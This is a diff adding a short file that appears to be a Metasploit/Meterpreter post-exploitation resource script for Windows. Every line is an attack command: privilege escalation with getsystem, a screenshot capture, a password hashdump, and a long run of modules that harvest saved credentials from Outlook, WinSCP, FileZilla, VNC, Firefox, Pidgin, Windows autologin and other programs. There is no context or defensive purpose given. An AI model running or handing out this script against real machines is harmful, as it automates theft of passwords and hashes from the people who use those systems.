@@ -1,0 +1,29 @@
+getsystem
+sysinfo
+show_mount
+screenshot -v -p dump.jpeg -v true
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/hashdump
+run post/windows/gather/credential_collector
+run post/windows/gather/credentials/wsftp_client
+run post/windows/gather/credentials/winscp
+run post/windows/gather/credentials/windows_autologin
+run post/windows/gather/credentials/vnc
+run post/windows/gather/credentials/trillian
+run post/windows/gather/credentials/total_commander
+run post/windows/gather/credentials/smartftp
+run post/windows/gather/credentials/outlook
+run post/windows/gather/credentials/nimbuzz
+run post/windows/gather/credentials/mremote
+run post/windows/gather/credentials/imail
+run post/windows/gather/credentials/idm
+run post/windows/gather/credentials/flashfxp
+run post/windows/gather/credentials/filezilla_server
+run post/windows/gather/credentials/meebo
+run post/windows/gather/credentials/coreftp
+run post/windows/gather/credentials/imvu
+run post/windows/gather/credentials/epo_sql
+run post/windows/gather/enum_ie
+run post/multi/gather/pidgin_cred
+run post/multi/gather/firefox_creds
+run post/multi/gather/filezilla_client_cred
